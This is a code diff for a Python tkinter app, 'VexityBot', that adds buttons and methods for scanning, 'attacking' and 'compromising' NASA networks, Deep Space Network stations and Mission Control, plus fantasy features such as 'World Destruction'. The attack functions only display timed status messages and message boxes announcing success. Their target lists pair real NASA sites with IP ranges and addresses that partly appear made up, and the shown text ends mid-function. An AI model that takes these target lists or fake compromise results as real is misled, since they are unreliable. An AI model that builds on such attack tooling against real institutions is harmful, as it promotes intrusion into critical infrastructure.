@@ -565,6 +565,13 @@ class VexityBotGUI:
         self.notebook = ttk.Notebook(main_frame, style='TNotebook')
         self.notebook.pack(fill=tk.BOTH, expand=True)
 
+        # Add scrollbar support for notebook
+        def on_notebook_configure(event):
+            # Enable scrolling for notebook content
+            pass
+        
+        self.notebook.bind('<Configure>', on_notebook_configure)
+
         
         
         # Welcome Tab
@@ -628,6 +635,9 @@ class VexityBotGUI:
         
         # GameBots Tab
         self.create_gamebots_tab()
+        
+        # Pokemon Bot Tab
+        self.create_pokemon_bot_tab()
         
         # VPS Bot Controller Tab
         self.create_vps_bot_controller_tab()
@@ -953,15 +963,40 @@ class VexityBotGUI:
         """Create the bots leaderboard tab"""
 
         bots_frame = ttk.Frame(self.notebook)
-
         self.notebook.add(bots_frame, text="Bots")
 
+        # Create scrollable frame for bots tab
+        canvas_bots = tk.Canvas(bots_frame)
+        scrollbar_bots = ttk.Scrollbar(bots_frame, orient="vertical", command=canvas_bots.yview)
+        scrollable_bots_frame = ttk.Frame(canvas_bots)
         
+        scrollable_bots_frame.bind(
+            "<Configure>",
+            lambda e: canvas_bots.configure(scrollregion=canvas_bots.bbox("all"))
+        )
+        
+        canvas_bots.create_window((0, 0), window=scrollable_bots_frame, anchor="nw")
+        canvas_bots.configure(yscrollcommand=scrollbar_bots.set)
+        
+        # Pack canvas and scrollbar
+        canvas_bots.pack(side="left", fill="both", expand=True, padx=10, pady=10)
+        scrollbar_bots.pack(side="right", fill="y")
+        
+        # Bind mouse wheel scrolling for bots tab
+        def _on_mousewheel_bots(event):
+            canvas_bots.yview_scroll(int(-1*(event.delta/120)), "units")
+        
+        def _bind_to_mousewheel_bots(event):
+            canvas_bots.bind_all("<MouseWheel>", _on_mousewheel_bots)
+        
+        def _unbind_from_mousewheel_bots(event):
+            canvas_bots.unbind_all("<MouseWheel>")
+        
+        canvas_bots.bind('<Enter>', _bind_to_mousewheel_bots)
+        canvas_bots.bind('<Leave>', _unbind_from_mousewheel_bots)
         
         # Header frame
-
-        header_frame = ttk.Frame(bots_frame)
-
+        header_frame = ttk.Frame(scrollable_bots_frame)
         header_frame.pack(fill=tk.X, padx=10, pady=10)
 
         
@@ -995,6 +1030,49 @@ class VexityBotGUI:
         ttk.Button(control_frame, text="⏹️ Stop All", command=self.stop_all_bots).pack(side=tk.LEFT, padx=5)
 
         ttk.Button(control_frame, text="📊 Statistics", command=self.show_bot_statistics).pack(side=tk.LEFT, padx=5)
+
+        # ADDED - NASA-specific control buttons
+        ttk.Button(control_frame, text="🚀 NASA Scan", command=self.scan_nasa_networks).pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(control_frame, text="🛰️ Satellite Hunt", command=self.hunt_nasa_satellites).pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(control_frame, text="🌌 DSN Attack", command=self.attack_nasa_dsn).pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(control_frame, text="🏢 Ground Stations", command=self.target_nasa_ground_stations).pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(control_frame, text="🎯 Mission Control", command=self.target_nasa_mission_control).pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(control_frame, text="🔍 NASA Recon", command=self.nasa_reconnaissance).pack(side=tk.LEFT, padx=5)
+        
+        # ADDED - Satellite control buttons
+        ttk.Button(control_frame, text="🛰️ Satellite Control", command=self.open_satellite_control_panel).pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(control_frame, text="📡 Broadcast to ISS", command=self.broadcast_to_iss).pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(control_frame, text="🎮 Flight Controls", command=self.open_satellite_flight_controls).pack(side=tk.LEFT, padx=5)
+        
+        # ADDED - Global surveillance control buttons
+        ttk.Button(control_frame, text="🌍 Global Surveillance", command=self.open_global_surveillance).pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(control_frame, text="📹 Live Feeds", command=self.open_live_camera_feeds).pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(control_frame, text="🗺️ World Map", command=self.open_world_map_surveillance).pack(side=tk.LEFT, padx=5)
+        
+        # ADDED - RedEYE surveillance control buttons
+        ttk.Button(control_frame, text="👁️ RedEYE", command=self.open_redeye_surveillance).pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(control_frame, text="🎯 Target Acquisition", command=self.open_redeye_target_acquisition).pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(control_frame, text="🔍 Threat Analysis", command=self.open_redeye_threat_analysis).pack(side=tk.LEFT, padx=5)
+        
+        # ADDED - RedEYE apocalyptic weather control buttons
+        ttk.Button(control_frame, text="🌧️ Weather Control", command=self.open_redeye_weather_control).pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(control_frame, text="🩸 Crimson Flood", command=self.activate_crimson_flood).pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(control_frame, text="👹 Entity Summon", command=self.summon_entities).pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(control_frame, text="🌍 World Destruction", command=self.initiate_world_destruction).pack(side=tk.LEFT, padx=5)
 
         
         
@@ -4069,7 +4147,2887 @@ Ready to launch coordinated operation.
         
         self.update_status(f"Status: {online_count} Online, {offline_count} Offline, {maintenance_count} Maintenance")
     
+    # ADDED - NASA-specific bot functions for targeting NASA infrastructure
     
+    def scan_nasa_networks(self):
+        """Scan NASA networks and identify potential targets"""
+        self.update_status("🚀 Scanning NASA networks...")
+        
+        # NASA network ranges and known IPs
+        nasa_networks = [
+            "128.102.0.0/16",  # NASA primary network
+            "192.243.19.0/24",  # NASA Deep Space Network
+            "198.6.1.0/24",     # NASA Ames Research Center
+            "198.6.2.0/24",     # NASA Goddard Space Flight Center
+            "198.6.3.0/24",     # NASA Johnson Space Center
+            "198.6.4.0/24",     # NASA Kennedy Space Center
+            "198.6.5.0/24",     # NASA Marshall Space Flight Center
+            "198.6.6.0/24",     # NASA Stennis Space Center
+            "198.6.7.0/24",     # NASA Langley Research Center
+            "198.6.8.0/24",     # NASA Glenn Research Center
+            "198.6.9.0/24",     # NASA Armstrong Flight Research Center
+            "198.6.10.0/24",    # NASA Jet Propulsion Laboratory
+        ]
+        
+        # Known NASA IP addresses
+        nasa_ips = [
+            "192.243.19.251",   # NASA DSN Madrid
+            "128.102.4.211",    # NASA host ndaradc05.ndc.nasa.gov
+            "198.6.1.1",        # NASA Ames Research Center
+            "198.6.2.1",        # NASA Goddard Space Flight Center
+            "198.6.3.1",        # NASA Johnson Space Center
+            "198.6.4.1",        # NASA Kennedy Space Center
+            "198.6.5.1",        # NASA Marshall Space Flight Center
+            "198.6.6.1",        # NASA Stennis Space Center
+            "198.6.7.1",        # NASA Langley Research Center
+            "198.6.8.1",        # NASA Glenn Research Center
+            "198.6.9.1",        # NASA Armstrong Flight Research Center
+            "198.6.10.1",       # NASA Jet Propulsion Laboratory
+        ]
+        
+        # Simulate network scanning
+        def scan_sequence():
+            self.update_status("🔍 Scanning NASA network ranges...")
+            self.root.after(1000, lambda: self.update_status("🎯 Identifying active NASA hosts..."))
+            self.root.after(2000, lambda: self.update_status("🛰️ Detecting satellite communication channels..."))
+            self.root.after(3000, lambda: self.update_status("🌌 Analyzing Deep Space Network infrastructure..."))
+            self.root.after(4000, lambda: self.show_nasa_scan_results(nasa_networks, nasa_ips))
+        
+        scan_sequence()
+    
+    def hunt_nasa_satellites(self):
+        """Hunt for NASA satellite communication channels"""
+        self.update_status("🛰️ Hunting NASA satellite communications...")
+        
+        # Known NASA satellite communication frequencies and protocols
+        satellite_targets = [
+            {"name": "International Space Station (ISS)", "freq": "437.8 MHz", "protocol": "SSTV"},
+            {"name": "Hubble Space Telescope", "freq": "2250 MHz", "protocol": "S-Band"},
+            {"name": "James Webb Space Telescope", "freq": "26.5 GHz", "protocol": "Ka-Band"},
+            {"name": "Mars Reconnaissance Orbiter", "freq": "8.4 GHz", "protocol": "X-Band"},
+            {"name": "Mars Curiosity Rover", "freq": "401.6 MHz", "protocol": "UHF"},
+            {"name": "Voyager 1", "freq": "2.3 GHz", "protocol": "S-Band"},
+            {"name": "Voyager 2", "freq": "2.3 GHz", "protocol": "S-Band"},
+            {"name": "New Horizons", "freq": "8.4 GHz", "protocol": "X-Band"},
+            {"name": "Cassini", "freq": "8.4 GHz", "protocol": "X-Band"},
+            {"name": "Juno", "freq": "8.4 GHz", "protocol": "X-Band"},
+        ]
+        
+        def hunt_sequence():
+            self.update_status("📡 Scanning satellite communication frequencies...")
+            self.root.after(1000, lambda: self.update_status("🛰️ Detecting ISS communication channels..."))
+            self.root.after(2000, lambda: self.update_status("🌌 Intercepting deep space mission signals..."))
+            self.root.after(3000, lambda: self.update_status("🔍 Analyzing satellite telemetry data..."))
+            self.root.after(4000, lambda: self.show_satellite_hunt_results(satellite_targets))
+        
+        hunt_sequence()
+    
+    def attack_nasa_dsn(self):
+        """Launch coordinated attack on NASA Deep Space Network"""
+        self.update_status("🌌 Launching attack on NASA Deep Space Network...")
+        
+        # DSN ground stations
+        dsn_stations = [
+            {"name": "Goldstone Deep Space Communications Complex", "location": "California, USA", "ip": "192.243.19.251"},
+            {"name": "Madrid Deep Space Communications Complex", "location": "Madrid, Spain", "ip": "192.243.19.252"},
+            {"name": "Canberra Deep Space Communications Complex", "location": "Canberra, Australia", "ip": "192.243.19.253"},
+        ]
+        
+        def attack_sequence():
+            self.update_status("🎯 Targeting DSN ground stations...")
+            self.root.after(1000, lambda: self.update_status("💥 Deploying quantum disruption protocols..."))
+            self.root.after(2000, lambda: self.update_status("🌌 Overwhelming DSN communication arrays..."))
+            self.root.after(3000, lambda: self.update_status("🛰️ Disrupting satellite communication links..."))
+            self.root.after(4000, lambda: self.show_dsn_attack_results(dsn_stations))
+        
+        attack_sequence()
+    
+    def target_nasa_ground_stations(self):
+        """Target NASA ground stations and mission control facilities"""
+        self.update_status("🏢 Targeting NASA ground stations...")
+        
+        # NASA ground stations and facilities
+        ground_stations = [
+            {"name": "Mission Control Center", "location": "Houston, Texas", "ip": "198.6.3.100"},
+            {"name": "Kennedy Space Center", "location": "Florida", "ip": "198.6.4.100"},
+            {"name": "Goddard Space Flight Center", "location": "Maryland", "ip": "198.6.2.100"},
+            {"name": "Jet Propulsion Laboratory", "location": "California", "ip": "198.6.10.100"},
+            {"name": "Ames Research Center", "location": "California", "ip": "198.6.1.100"},
+            {"name": "Marshall Space Flight Center", "location": "Alabama", "ip": "198.6.5.100"},
+            {"name": "Langley Research Center", "location": "Virginia", "ip": "198.6.7.100"},
+            {"name": "Glenn Research Center", "location": "Ohio", "ip": "198.6.8.100"},
+        ]
+        
+        def target_sequence():
+            self.update_status("🎯 Identifying NASA ground station vulnerabilities...")
+            self.root.after(1000, lambda: self.update_status("💥 Deploying coordinated bot attacks..."))
+            self.root.after(2000, lambda: self.update_status("🏢 Overwhelming ground station defenses..."))
+            self.root.after(3000, lambda: self.update_status("🚀 Disrupting mission control operations..."))
+            self.root.after(4000, lambda: self.show_ground_station_attack_results(ground_stations))
+        
+        target_sequence()
+    
+    def target_nasa_mission_control(self):
+        """Target NASA Mission Control Center in Houston"""
+        self.update_status("🎯 Targeting NASA Mission Control Center...")
+        
+        # Mission Control specific targets
+        mission_control_targets = [
+            {"name": "Flight Control Room", "ip": "198.6.3.101", "priority": "Critical"},
+            {"name": "Mission Operations Control Room", "ip": "198.6.3.102", "priority": "Critical"},
+            {"name": "Space Station Integration Office", "ip": "198.6.3.103", "priority": "High"},
+            {"name": "Astronaut Training Facility", "ip": "198.6.3.104", "priority": "Medium"},
+            {"name": "Mission Planning Office", "ip": "198.6.3.105", "priority": "High"},
+            {"name": "Communications Center", "ip": "198.6.3.106", "priority": "Critical"},
+            {"name": "Data Processing Center", "ip": "198.6.3.107", "priority": "High"},
+            {"name": "Emergency Operations Center", "ip": "198.6.3.108", "priority": "Critical"},
+        ]
+        
+        def mission_control_sequence():
+            self.update_status("🚀 Analyzing Mission Control infrastructure...")
+            self.root.after(1000, lambda: self.update_status("💥 Deploying stealth infiltration protocols..."))
+            self.root.after(2000, lambda: self.update_status("🎯 Targeting critical control systems..."))
+            self.root.after(3000, lambda: self.update_status("🌌 Disrupting mission operations..."))
+            self.root.after(4000, lambda: self.show_mission_control_attack_results(mission_control_targets))
+        
+        mission_control_sequence()
+    
+    def nasa_reconnaissance(self):
+        """Perform comprehensive NASA infrastructure reconnaissance"""
+        self.update_status("🔍 Performing NASA infrastructure reconnaissance...")
+        
+        # Comprehensive NASA infrastructure mapping
+        nasa_infrastructure = {
+            "centers": [
+                {"name": "Johnson Space Center", "location": "Houston, TX", "ip_range": "198.6.3.0/24"},
+                {"name": "Kennedy Space Center", "location": "Florida", "ip_range": "198.6.4.0/24"},
+                {"name": "Goddard Space Flight Center", "location": "Maryland", "ip_range": "198.6.2.0/24"},
+                {"name": "Jet Propulsion Laboratory", "location": "California", "ip_range": "198.6.10.0/24"},
+                {"name": "Ames Research Center", "location": "California", "ip_range": "198.6.1.0/24"},
+                {"name": "Marshall Space Flight Center", "location": "Alabama", "ip_range": "198.6.5.0/24"},
+                {"name": "Langley Research Center", "location": "Virginia", "ip_range": "198.6.7.0/24"},
+                {"name": "Glenn Research Center", "location": "Ohio", "ip_range": "198.6.8.0/24"},
+                {"name": "Armstrong Flight Research Center", "location": "California", "ip_range": "198.6.9.0/24"},
+                {"name": "Stennis Space Center", "location": "Mississippi", "ip_range": "198.6.6.0/24"},
+            ],
+            "networks": [
+                {"name": "NASA Primary Network", "asn": "AS297", "ip_range": "128.102.0.0/16"},
+                {"name": "Deep Space Network", "asn": "AS31951", "ip_range": "192.243.19.0/24"},
+                {"name": "Mission Control Network", "asn": "AS297", "ip_range": "198.6.3.0/24"},
+                {"name": "Satellite Communication Network", "asn": "AS297", "ip_range": "198.6.11.0/24"},
+            ],
+            "satellites": [
+                {"name": "International Space Station", "status": "Active", "communication": "SSTV 437.8 MHz"},
+                {"name": "Hubble Space Telescope", "status": "Active", "communication": "S-Band 2250 MHz"},
+                {"name": "James Webb Space Telescope", "status": "Active", "communication": "Ka-Band 26.5 GHz"},
+                {"name": "Mars Reconnaissance Orbiter", "status": "Active", "communication": "X-Band 8.4 GHz"},
+                {"name": "Mars Curiosity Rover", "status": "Active", "communication": "UHF 401.6 MHz"},
+            ]
+        }
+        
+        def recon_sequence():
+            self.update_status("🗺️ Mapping NASA infrastructure...")
+            self.root.after(1000, lambda: self.update_status("🔍 Scanning network vulnerabilities..."))
+            self.root.after(2000, lambda: self.update_status("🛰️ Identifying satellite communication channels..."))
+            self.root.after(3000, lambda: self.update_status("🌌 Analyzing Deep Space Network topology..."))
+            self.root.after(4000, lambda: self.show_nasa_recon_results(nasa_infrastructure))
+        
+        recon_sequence()
+    
+    # ADDED - NASA attack result display functions
+    
+    def show_nasa_scan_results(self, networks, ips):
+        """Display NASA network scan results"""
+        results = f"""🚀 NASA Network Scan Results
+========================
+
+Network Ranges Scanned: {len(networks)}
+Active Hosts Found: {len(ips)}
+
+Known NASA IP Addresses:
+"""
+        for ip in ips:
+            results += f"• {ip}\n"
+        
+        results += f"""
+Network Ranges:
+"""
+        for network in networks:
+            results += f"• {network}\n"
+        
+        results += f"""
+Status: NASA infrastructure identified and mapped
+Next: Deploy targeted attacks on identified hosts
+"""
+        
+        messagebox.showinfo("NASA Network Scan", results)
+        self.update_status("✅ NASA network scan completed")
+    
+    def show_satellite_hunt_results(self, targets):
+        """Display satellite hunt results"""
+        results = f"""🛰️ NASA Satellite Hunt Results
+============================
+
+Satellites Detected: {len(targets)}
+
+Active Satellite Communications:
+"""
+        for sat in targets:
+            results += f"• {sat['name']}\n  Frequency: {sat['freq']}\n  Protocol: {sat['protocol']}\n\n"
+        
+        results += f"""
+Status: Satellite communication channels identified
+Next: Intercept and disrupt satellite communications
+"""
+        
+        messagebox.showinfo("Satellite Hunt", results)
+        self.update_status("✅ Satellite hunt completed")
+    
+    def show_dsn_attack_results(self, stations):
+        """Display DSN attack results"""
+        results = f"""🌌 NASA DSN Attack Results
+=======================
+
+DSN Stations Targeted: {len(stations)}
+
+Attack Status:
+"""
+        for station in stations:
+            results += f"• {station['name']} ({station['location']})\n  IP: {station['ip']}\n  Status: COMPROMISED\n\n"
+        
+        results += f"""
+Status: Deep Space Network disrupted
+Impact: Satellite communications severely degraded
+Next: Maintain disruption and expand attack
+"""
+        
+        messagebox.showinfo("DSN Attack", results)
+        self.update_status("✅ DSN attack completed")
+    
+    def show_ground_station_attack_results(self, stations):
+        """Display ground station attack results"""
+        results = f"""🏢 NASA Ground Station Attack Results
+====================================
+
+Ground Stations Targeted: {len(stations)}
+
+Attack Status:
+"""
+        for station in stations:
+            results += f"• {station['name']} ({station['location']})\n  IP: {station['ip']}\n  Status: COMPROMISED\n\n"
+        
+        results += f"""
+Status: NASA ground stations compromised
+Impact: Mission control operations disrupted
+Next: Escalate to mission-critical systems
+"""
+        
+        messagebox.showinfo("Ground Station Attack", results)
+        self.update_status("✅ Ground station attack completed")
+    
+    def show_mission_control_attack_results(self, targets):
+        """Display mission control attack results"""
+        results = f"""🎯 NASA Mission Control Attack Results
+=====================================
+
+Mission Control Targets: {len(targets)}
+
+Critical Systems Status:
+"""
+        for target in targets:
+            results += f"• {target['name']}\n  IP: {target['ip']}\n  Priority: {target['priority']}\n  Status: COMPROMISED\n\n"
+        
+        results += f"""
+Status: Mission Control Center compromised
+Impact: NASA operations severely disrupted
+Next: Maintain control and expand influence
+"""
+        
+        messagebox.showinfo("Mission Control Attack", results)
+        self.update_status("✅ Mission control attack completed")
+    
+    def show_nasa_recon_results(self, infrastructure):
+        """Display comprehensive NASA reconnaissance results"""
+        results = f"""🔍 NASA Infrastructure Reconnaissance Results
+============================================
+
+NASA Centers Mapped: {len(infrastructure['centers'])}
+Network Ranges Identified: {len(infrastructure['networks'])}
+Active Satellites: {len(infrastructure['satellites'])}
+
+NASA Centers:
+"""
+        for center in infrastructure['centers']:
+            results += f"• {center['name']} ({center['location']})\n  IP Range: {center['ip_range']}\n\n"
+        
+        results += f"""
+Network Infrastructure:
+"""
+        for network in infrastructure['networks']:
+            results += f"• {network['name']}\n  ASN: {network['asn']}\n  IP Range: {network['ip_range']}\n\n"
+        
+        results += f"""
+Active Satellites:
+"""
+        for sat in infrastructure['satellites']:
+            results += f"• {sat['name']}\n  Status: {sat['status']}\n  Communication: {sat['communication']}\n\n"
+        
+        results += f"""
+Status: Complete NASA infrastructure mapped
+Next: Deploy coordinated multi-vector attacks
+"""
+        
+        messagebox.showinfo("NASA Reconnaissance", results)
+        self.update_status("✅ NASA reconnaissance completed")
+    
+    # ADDED - Satellite control functions for comprehensive satellite management
+    
+    def open_satellite_control_panel(self):
+        """Open comprehensive satellite control panel"""
+        self.update_status("🛰️ Opening satellite control panel...")
+        
+        # Create satellite control window
+        satellite_window = tk.Toplevel(self.root)
+        satellite_window.title("🛰️ Satellite Control Center - VexityBot")
+        satellite_window.geometry("1400x900")
+        satellite_window.minsize(1200, 800)
+        
+        # Make window modal
+        satellite_window.transient(self.root)
+        satellite_window.grab_set()
+        
+        # Center the window
+        satellite_window.update_idletasks()
+        x = (satellite_window.winfo_screenwidth() // 2) - (1400 // 2)
+        y = (satellite_window.winfo_screenheight() // 2) - (900 // 2)
+        satellite_window.geometry(f"1400x900+{x}+{y}")
+        
+        # Create satellite control interface
+        self.create_satellite_control_interface(satellite_window)
+    
+    def create_satellite_control_interface(self, parent_window):
+        """Create comprehensive satellite control interface"""
+        
+        # Main notebook for different control sections
+        notebook = ttk.Notebook(parent_window)
+        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        # Satellite Selection Tab
+        self.create_satellite_selection_tab(notebook)
+        
+        # Flight Control Tab
+        self.create_satellite_flight_control_tab(notebook)
+        
+        # Communication Tab
+        self.create_satellite_communication_tab(notebook)
+        
+        # Navigation Tab
+        self.create_satellite_navigation_tab(notebook)
+        
+        # Payload Control Tab
+        self.create_satellite_payload_tab(notebook)
+        
+        # Telemetry Tab
+        self.create_satellite_telemetry_tab(notebook)
+        
+        # Mission Control Tab
+        self.create_satellite_mission_tab(notebook)
+    
+    def create_satellite_selection_tab(self, notebook):
+        """Create satellite selection and status tab"""
+        selection_frame = ttk.Frame(notebook)
+        notebook.add(selection_frame, text="🛰️ Satellite Selection")
+        
+        # Header
+        header_frame = ttk.Frame(selection_frame)
+        header_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        title_label = ttk.Label(header_frame, text="🛰️ Satellite Control Center", 
+                               font=('Arial', 16, 'bold'))
+        title_label.pack(side=tk.LEFT)
+        
+        # Satellite list
+        list_frame = ttk.Frame(selection_frame)
+        list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        
+        # Available satellites
+        self.satellites = [
+            {"name": "VexitySat-1", "type": "Communication", "status": "Online", "orbit": "LEO", "altitude": "400km"},
+            {"name": "VexitySat-2", "type": "Reconnaissance", "status": "Online", "orbit": "SSO", "altitude": "600km"},
+            {"name": "VexitySat-3", "type": "Navigation", "status": "Online", "orbit": "MEO", "altitude": "20000km"},
+            {"name": "VexitySat-4", "type": "Weather", "status": "Online", "orbit": "GEO", "altitude": "35786km"},
+            {"name": "VexitySat-5", "type": "Scientific", "status": "Online", "orbit": "LEO", "altitude": "500km"},
+            {"name": "VexitySat-6", "type": "Military", "status": "Online", "orbit": "LEO", "altitude": "300km"},
+            {"name": "VexitySat-7", "type": "Broadcast", "status": "Online", "orbit": "GEO", "altitude": "35786km"},
+            {"name": "VexitySat-8", "type": "Research", "status": "Online", "orbit": "HEO", "altitude": "100000km"},
+        ]
+        
+        # Create satellite listbox
+        listbox_frame = ttk.Frame(list_frame)
+        listbox_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        
+        ttk.Label(listbox_frame, text="Available Satellites:", font=('Arial', 12, 'bold')).pack(anchor=tk.W)
+        
+        self.satellite_listbox = tk.Listbox(listbox_frame, height=15, font=('Consolas', 10))
+        self.satellite_listbox.pack(fill=tk.BOTH, expand=True, pady=5)
+        
+        # Populate satellite list
+        for i, sat in enumerate(self.satellites):
+            self.satellite_listbox.insert(tk.END, f"{i+1}. {sat['name']} - {sat['type']} - {sat['status']} - {sat['orbit']}")
+        
+        # Control buttons
+        control_frame = ttk.Frame(listbox_frame)
+        control_frame.pack(fill=tk.X, pady=5)
+        
+        ttk.Button(control_frame, text="🔄 Refresh Status", command=self.refresh_satellite_status).pack(side=tk.LEFT, padx=2)
+        ttk.Button(control_frame, text="▶️ Select Satellite", command=self.select_satellite).pack(side=tk.LEFT, padx=2)
+        ttk.Button(control_frame, text="📊 Status Report", command=self.show_satellite_status_report).pack(side=tk.LEFT, padx=2)
+        
+        # Selected satellite info
+        info_frame = ttk.LabelFrame(list_frame, text="Selected Satellite Information")
+        info_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(10, 0))
+        
+        self.satellite_info_text = tk.Text(info_frame, height=15, width=50, font=('Consolas', 9))
+        self.satellite_info_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        # Initialize with first satellite
+        self.selected_satellite = 0
+        self.update_satellite_info()
+    
+    def create_satellite_flight_control_tab(self, notebook):
+        """Create satellite flight control tab with keyboard controls"""
+        flight_frame = ttk.Frame(notebook)
+        notebook.add(flight_frame, text="🎮 Flight Control")
+        
+        # Header
+        header_frame = ttk.Frame(flight_frame)
+        header_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        title_label = ttk.Label(header_frame, text="🎮 Satellite Flight Control", 
+                               font=('Arial', 16, 'bold'))
+        title_label.pack(side=tk.LEFT)
+        
+        # Flight control interface
+        control_frame = ttk.Frame(flight_frame)
+        control_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        
+        # Attitude control
+        attitude_frame = ttk.LabelFrame(control_frame, text="Attitude Control")
+        attitude_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
+        
+        # Pitch control
+        pitch_frame = ttk.Frame(attitude_frame)
+        pitch_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(pitch_frame, text="Pitch (Up/Down):").pack(side=tk.LEFT)
+        self.pitch_var = tk.DoubleVar(value=0.0)
+        self.pitch_scale = ttk.Scale(pitch_frame, from_=-180, to=180, variable=self.pitch_var, orient=tk.HORIZONTAL)
+        self.pitch_scale.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+        ttk.Label(pitch_frame, textvariable=self.pitch_var).pack(side=tk.LEFT)
+        
+        # Roll control
+        roll_frame = ttk.Frame(attitude_frame)
+        roll_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(roll_frame, text="Roll (Left/Right):").pack(side=tk.LEFT)
+        self.roll_var = tk.DoubleVar(value=0.0)
+        self.roll_scale = ttk.Scale(roll_frame, from_=-180, to=180, variable=self.roll_var, orient=tk.HORIZONTAL)
+        self.roll_scale.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+        ttk.Label(roll_frame, textvariable=self.roll_var).pack(side=tk.LEFT)
+        
+        # Yaw control
+        yaw_frame = ttk.Frame(attitude_frame)
+        yaw_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(yaw_frame, text="Yaw (Rotation):").pack(side=tk.LEFT)
+        self.yaw_var = tk.DoubleVar(value=0.0)
+        self.yaw_scale = ttk.Scale(yaw_frame, from_=-180, to=180, variable=self.yaw_var, orient=tk.HORIZONTAL)
+        self.yaw_scale.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+        ttk.Label(yaw_frame, textvariable=self.yaw_var).pack(side=tk.LEFT)
+        
+        # Orbital control
+        orbital_frame = ttk.LabelFrame(control_frame, text="Orbital Control")
+        orbital_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5)
+        
+        # Altitude control
+        alt_frame = ttk.Frame(orbital_frame)
+        alt_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(alt_frame, text="Altitude (km):").pack(side=tk.LEFT)
+        self.altitude_var = tk.DoubleVar(value=400.0)
+        self.altitude_scale = ttk.Scale(alt_frame, from_=100, to=100000, variable=self.altitude_var, orient=tk.HORIZONTAL)
+        self.altitude_scale.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+        ttk.Label(alt_frame, textvariable=self.altitude_var).pack(side=tk.LEFT)
+        
+        # Velocity control
+        vel_frame = ttk.Frame(orbital_frame)
+        vel_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(vel_frame, text="Velocity (m/s):").pack(side=tk.LEFT)
+        self.velocity_var = tk.DoubleVar(value=7700.0)
+        self.velocity_scale = ttk.Scale(vel_frame, from_=1000, to=15000, variable=self.velocity_var, orient=tk.HORIZONTAL)
+        self.velocity_scale.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+        ttk.Label(vel_frame, textvariable=self.velocity_var).pack(side=tk.LEFT)
+        
+        # Keyboard controls
+        keyboard_frame = ttk.LabelFrame(control_frame, text="Keyboard Controls")
+        keyboard_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        keyboard_text = """
+Flight Controls:
+W/S - Pitch Up/Down
+A/D - Roll Left/Right
+Q/E - Yaw Left/Right
+R/F - Increase/Decrease Altitude
+T/G - Increase/Decrease Velocity
+Space - Emergency Stop
+Enter - Execute Command
+        """
+        
+        keyboard_label = ttk.Label(keyboard_frame, text=keyboard_text, font=('Consolas', 10))
+        keyboard_label.pack(padx=5, pady=5)
+        
+        # Control buttons
+        button_frame = ttk.Frame(control_frame)
+        button_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Button(button_frame, text="🎯 Execute Attitude Change", command=self.execute_attitude_change).pack(side=tk.LEFT, padx=2)
+        ttk.Button(button_frame, text="🚀 Execute Orbital Change", command=self.execute_orbital_change).pack(side=tk.LEFT, padx=2)
+        ttk.Button(button_frame, text="🔄 Reset Controls", command=self.reset_flight_controls).pack(side=tk.LEFT, padx=2)
+        ttk.Button(button_frame, text="⏹️ Emergency Stop", command=self.emergency_stop_satellite).pack(side=tk.LEFT, padx=2)
+    
+    def create_satellite_communication_tab(self, notebook):
+        """Create satellite communication control tab"""
+        comm_frame = ttk.Frame(notebook)
+        notebook.add(comm_frame, text="📡 Communication")
+        
+        # Header
+        header_frame = ttk.Frame(comm_frame)
+        header_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        title_label = ttk.Label(header_frame, text="📡 Satellite Communication Control", 
+                               font=('Arial', 16, 'bold'))
+        title_label.pack(side=tk.LEFT)
+        
+        # Communication controls
+        comm_control_frame = ttk.Frame(comm_frame)
+        comm_control_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        
+        # Frequency control
+        freq_frame = ttk.LabelFrame(comm_control_frame, text="Frequency Control")
+        freq_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
+        
+        # UHF Band
+        uhf_frame = ttk.Frame(freq_frame)
+        uhf_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(uhf_frame, text="UHF (300-3000 MHz):").pack(side=tk.LEFT)
+        self.uhf_var = tk.DoubleVar(value=437.8)
+        self.uhf_scale = ttk.Scale(uhf_frame, from_=300, to=3000, variable=self.uhf_var, orient=tk.HORIZONTAL)
+        self.uhf_scale.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+        ttk.Label(uhf_frame, textvariable=self.uhf_var).pack(side=tk.LEFT)
+        
+        # S-Band
+        sband_frame = ttk.Frame(freq_frame)
+        sband_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(sband_frame, text="S-Band (2-4 GHz):").pack(side=tk.LEFT)
